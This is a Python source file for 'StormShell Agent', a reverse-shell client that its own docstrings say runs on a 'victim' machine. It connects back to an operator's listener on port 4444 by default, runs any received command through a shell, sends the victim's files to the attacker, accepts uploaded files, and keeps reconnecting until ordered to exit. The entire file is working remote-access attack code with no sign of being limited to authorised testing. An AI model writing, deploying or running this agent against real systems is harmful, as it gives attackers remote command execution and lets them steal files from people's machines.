#!/usr/bin/env python3
"""
StormShell - Agent Module

A resilient TCP client that connects back to the StormShell listener.
This module runs on the target (victim) machine, establishes a reverse
TCP connection to the handler, and enters a receive loop — executing
OS commands via subprocess and returning results to the operator.

Supports file download (victim → attacker) and file upload
(attacker → victim) via a size-prefixed binary transfer protocol.

If the connection is lost or the listener is unavailable, the agent
automatically retries at a configurable interval until the operator
explicitly sends the 'exit' command or the process is interrupted.
"""

import argparse
import logging
import os
import socket
import subprocess
import sys
import time

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
BUFFER_SIZE = 4096       # Max bytes to receive per recv() call
RECONNECT_DELAY = 5      # Seconds to wait between reconnection attempts
HEADER_SIZE = 16         # Fixed-length header carrying the file size

# ---------------------------------------------------------------------------
# Logger configuration
# ---------------------------------------------------------------------------
LOG_FORMAT = "%(asctime)s [%(levelname)s] %(name)s: %(message)s"
logger = logging.getLogger("stormshell.agent")


class Agent:
    """
    Resilient reverse-shell agent that initiates an outbound TCP connection
    to the StormShell listener.  If the connection fails or drops, the
    agent automatically retries every RECONNECT_DELAY seconds until the
    operator sends 'exit' or the process is killed.

    Attributes:
        host (str):   IP address of the remote listener.
        port (int):   TCP port of the remote listener.
        sock (socket.socket | None): The client socket instance.
        _shutdown (bool): Flag set by the 'exit' command to stop reconnecting.
    """

    def __init__(self, host: str = "127.0.0.1", port: int = 4444) -> None:
        """
        Initialize the Agent with the target listener address.

        Args:
            host: The IP address of the StormShell listener to connect to.
            port: The TCP port of the StormShell listener to connect to.
        """
        self.host: str = host
        self.port: int = port
        self.sock: socket.socket | None = None
        self._shutdown: bool = False

    # ------------------------------------------------------------------
    # Socket lifecycle
    # ------------------------------------------------------------------

    def _create_socket(self) -> None:
        """Create a TCP client socket for the outbound connection."""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        logger.debug("Client socket created.")

    def _connect(self) -> bool:
        """
        Attempt to connect to the remote StormShell listener.

        Returns:
            True if the connection was established successfully,
            False otherwise (caller should retry).
        """
        try:
            self.sock.connect((self.host, self.port))
            logger.info(
                "Connected to listener at %s:%d", self.host, self.port
            )
            print(f"[+] Connected to {self.host}:{self.port}")
            return True
        except ConnectionRefusedError:
            logger.debug(
                "Connection refused by %s:%d.", self.host, self.port
            )
            return False
        except TimeoutError:
            logger.debug(
                "Connection to %s:%d timed out.", self.host, self.port
            )
            return False
        except OSError as exc:
            logger.debug(
                "Connection failed to %s:%d — %s",
                self.host,
                self.port,
                exc,
            )
            return False

    # ------------------------------------------------------------------
    # Command execution helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _handle_cd(path: str) -> str:
        """
        Change the agent's working directory using os.chdir().

        subprocess spawns a child process, so a 'cd' executed inside it
        would only affect that child — not the agent itself.  This method
        applies the directory change at the agent (parent) level.

        Args:
            path: Target directory path.  Defaults to the user's home
                  directory when an empty string is supplied.

        Returns:
            A human-readable status message indicating success or failure.
        """
        target = path if path else os.path.expanduser("~")
        try:
            os.chdir(target)
            cwd = os.getcwd()
            logger.info("Changed directory to %s", cwd)
            return f"[+] Changed directory to: {cwd}"
        except FileNotFoundError:
            msg = f"[!] Directory not found: {target}"
            logger.warning(msg)
            return msg
        except PermissionError:
            msg = f"[!] Permission denied: {target}"
            logger.warning(msg)
            return msg
        except OSError as exc:
            msg = f"[!] Failed to change directory: {exc}"
            logger.error(msg)
            return msg

    @staticmethod
    def _execute_command(command: str) -> str:
        """
        Execute an OS command via subprocess and return its output.

        Uses ``shell=True`` so that shell built-ins and pipelines work
        correctly.  Both stdout and stderr are captured and merged into
        a single result string.

        Args:
            command: The raw shell command string to execute.

        Returns:
            The combined stdout + stderr output of the command, or a
            status / error message if the command produced no output or
            raised an exception.
        """
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                timeout=30,
            )

            stdout = result.stdout.decode("utf-8", errors="replace").strip()
            stderr = result.stderr.decode("utf-8", errors="replace").strip()

            # Merge stdout and stderr into a single response.
            output_parts: list[str] = []
            if stdout:
                output_parts.append(stdout)
            if stderr:
                output_parts.append(stderr)

            if output_parts:
                return "\n".join(output_parts)

            # Command succeeded but produced no output (e.g. mkdir, touch).
            return (
                f"[+] Command executed successfully (no output). "
                f"Exit code: {result.returncode}"
            )

        except subprocess.TimeoutExpired:
            msg = f"[!] Command timed out: {command}"
            logger.warning(msg)
            return msg
        except OSError as exc:
            msg = f"[!] Execution error: {exc}"
            logger.error(msg)
            return msg

    # ------------------------------------------------------------------
    # Network helpers
    # ------------------------------------------------------------------

    def _recv_exact(self, length: int) -> bytes:
        """
        Receive exactly *length* bytes from the socket.

        TCP is a stream protocol so a single recv() may return fewer
        bytes than requested.  This loops until the full payload arrives.

        Args:
            length: Number of bytes to receive.

        Returns:
            Complete byte string of the requested length.

        Raises:
            ConnectionError: If the peer disconnects prematurely.
        """
        data = b""
        while len(data) < length:
            chunk = self.sock.recv(min(BUFFER_SIZE, length - len(data)))
            if not chunk:
                raise ConnectionError("Connection closed during transfer.")
            data += chunk
        return data

    # ------------------------------------------------------------------
    # File transfer handlers
    # ------------------------------------------------------------------

    def _handle_download(self, file_path: str) -> None:
        """
        Send a local file to the listener (victim → attacker).

        Protocol:
            1. Agent receives ``download <path>`` (already parsed).
            2. Agent sends a 16-byte size header with the file size.
               - On error: sends ``ERROR:<err_len>`` header followed by
                 the error message.
            3. Agent streams the file data in BUFFER_SIZE chunks.

        Args:
            file_path: Absolute or relative path on the agent's filesystem.
        """
        try:
            with open(file_path, "rb") as fp:
                file_data = fp.read()
        except FileNotFoundError:
            self._send_file_error(f"[!] File not found: {file_path}")
            return
        except PermissionError:
            self._send_file_error(f"[!] Permission denied: {file_path}")
            return
        except OSError as exc:
            self._send_file_error(f"[!] Cannot read file: {exc}")
            return

        file_size = len(file_data)
        header = str(file_size).zfill(HEADER_SIZE).encode("utf-8")

        try:
            self.sock.sendall(header)
            for offset in range(0, file_size, BUFFER_SIZE):
                self.sock.sendall(file_data[offset:offset + BUFFER_SIZE])
            logger.info("Sent file %s (%d bytes).", file_path, file_size)
        except (BrokenPipeError, ConnectionResetError, OSError) as exc:
            logger.error("Failed to send file — %s", exc)

    def _send_file_error(self, message: str) -> None:
        """
        Send an error header + message to the listener so it knows the
        file transfer cannot proceed.

        Format: ``ERROR:<message_length>`` (16 bytes) + message bytes.

        Args:
            message: Human-readable error description.
        """
        encoded = message.encode("utf-8")
        err_header = f"ERROR:{len(encoded)}".ljust(HEADER_SIZE).encode("utf-8")
        try:
            self.sock.sendall(err_header + encoded)
            logger.debug("Sent file error: %s", message)
        except OSError:
            pass

    def _handle_upload(self, command: str) -> None:
        """
        Receive a file from the listener (attacker → victim).

        Protocol:
            1. Agent receives ``upload <path>``.
            2. Agent sends ``READY`` acknowledgement.
            3. Listener sends a 16-byte size header + file data.
            4. Agent writes the data to a local file and sends
               a confirmation message back.

        Args:
            command: The full ``upload <path>`` command string.
        """
        # Extract the desired filename from the remote path.
        remote_path = command.split(" ", 1)[1].strip()
        local_name = os.path.basename(remote_path)

        try:
            # Signal readiness to the listener.
            self.sock.sendall(b"READY")

            # --- Receive size header ---
            header = self._recv_exact(HEADER_SIZE)
            header_str = header.decode("utf-8").strip()
            file_size = int(header_str)

            # --- Receive file data ---
            file_data = self._recv_exact(file_size)

            with open(local_name, "wb") as fp:
                fp.write(file_data)

            confirm = (
                f"[+] Upload received: '{local_name}' "
                f"({file_size:,} bytes)"
            )
            self.sock.sendall(confirm.encode("utf-8"))
            logger.info(
                "Received upload %s (%d bytes).", local_name, file_size
            )

        except (ConnectionError, ValueError, OSError) as exc:
            logger.error("Upload receive failed — %s", exc)

    # ------------------------------------------------------------------
    # Interactive receive loop
    # ------------------------------------------------------------------

    def _receive_loop(self) -> None:
        """
        Continuously listen for commands from the StormShell listener,
        execute them on the host operating system, and send results back.

        Behaviour:
            - 'exit'            → shut down permanently.
            - 'cd <path>'       → persistent directory change.
            - 'download <path>' → send file to listener.
            - 'upload <path>'   → receive file from listener.
            - Others            → executed via subprocess.
        """
        logger.info("Entered receive loop — waiting for commands.")

        while True:
            try:
                data = self.sock.recv(BUFFER_SIZE)

                # Empty data means the listener disconnected.
                if not data:
                    logger.warning("Listener disconnected (empty data).")
                    break

                command = data.decode("utf-8", errors="replace").strip()
                logger.debug("Received command: %s", command)

                # Handle the 'exit' shutdown command.
                if command.lower() == "exit":
                    logger.info("Exit command received. Shutting down.")
                    self._shutdown = True
                    break

                # Handle 'cd' as a special case (persistent directory change).
                if command.lower() == "cd" or command.lower().startswith("cd "):
                    path = command[3:].strip()
                    response = self._handle_cd(path)

                # Handle file download (agent → listener).
                elif command.lower().startswith("download "):
                    file_path = command.split(" ", 1)[1].strip()
                    self._handle_download(file_path)
                    continue

                # Handle file upload (listener → agent).
                elif command.lower().startswith("upload "):
                    self._handle_upload(command)
                    continue

                else:
                    response = self._execute_command(command)

                # Send the result back to the listener.
                try:
                    self.sock.sendall(response.encode("utf-8"))
                    logger.debug("Sent response (%d bytes).", len(response))
                except (BrokenPipeError, ConnectionResetError, OSError) as exc:
                    logger.error("Failed to send response — %s", exc)
                    break

            except (ConnectionResetError, OSError) as exc:
                logger.error("Connection lost — %s", exc)
                break

        logger.info("Receive loop ended.")

    # ------------------------------------------------------------------
    # Cleanup helpers
    # ------------------------------------------------------------------

    def _cleanup(self) -> None:
        """Gracefully close the client socket if it is open."""
        if self.sock:
            try:
                self.sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                # Socket may already be disconnected — ignore.
                pass
            finally:
                self.sock.close()
                self.sock = None
                logger.debug("Client socket closed.")

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def start(self) -> None:
        """
        Persistent agent lifecycle with automatic reconnection.

        Outer loop: continuously attempts to connect to the listener.
            If connection fails  → wait RECONNECT_DELAY, retry.
            If connection drops  → cleanup, wait, retry.
            If 'exit' received   → set _shutdown flag, break permanently.
            If KeyboardInterrupt → break permanently.
        """
        try:
            while not self._shutdown:
                # --- Attempt connection ---
                self._create_socket()
                if not self._connect():
                    self._cleanup()
                    print(
                        f"[*] Retrying in {RECONNECT_DELAY}s …"
                    )
                    logger.info(
                        "Reconnecting in %d seconds.", RECONNECT_DELAY
                    )
                    time.sleep(RECONNECT_DELAY)
                    continue

                # --- Connection established — enter command loop ---
                self._receive_loop()

                # After the receive loop ends, clean up the current socket
                # before deciding whether to reconnect or exit.
                self._cleanup()

                if self._shutdown:
                    break

                # Connection was lost (not an 'exit') — reconnect.
                print(
                    f"[*] Connection lost. Reconnecting in "
                    f"{RECONNECT_DELAY}s …"
                )
                logger.info(
                    "Connection lost. Reconnecting in %d seconds.",
                    RECONNECT_DELAY,
                )
                time.sleep(RECONNECT_DELAY)

        except KeyboardInterrupt:
            print("\n[!] Keyboard interrupt received. Shutting down …")
            logger.warning("Keyboard interrupt — shutting down.")

        finally:
            self._cleanup()
            print("[*] Agent exiting.\n")
            logger.info("Agent exited.")


# ---------------------------------------------------------------------------
# CLI entry point
# ---------------------------------------------------------------------------

def _parse_args() -> argparse.Namespace:
    """
    Build and return the argument parser for the StormShell agent.

    Returns:
        argparse.Namespace with `host`, `port`, and `verbose` attributes.
    """
    parser = argparse.ArgumentParser(
        description="StormShell Agent — Reverse Shell Client",
    )
    parser.add_argument(
        "--host",
        type=str,
        default="127.0.0.1",
        help="IP address of the StormShell listener (default: 127.0.0.1)",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=4444,
        help="TCP port of the StormShell listener (default: 4444)",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        default=False,
        help="Enable verbose (DEBUG) logging output",
    )
    return parser.parse_args()


def main() -> None:
    """Parse arguments, configure logging, and start the agent."""
    args = _parse_args()

    log_level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(level=log_level, format=LOG_FORMAT)

    print("\n[*] StormShell Agent starting …")
    logger.info(
        "Agent initializing — target %s:%d", args.host, args.port
    )

    agent = Agent(host=args.host, port=args.port)
    agent.start()


if __name__ == "__main__":
    main()
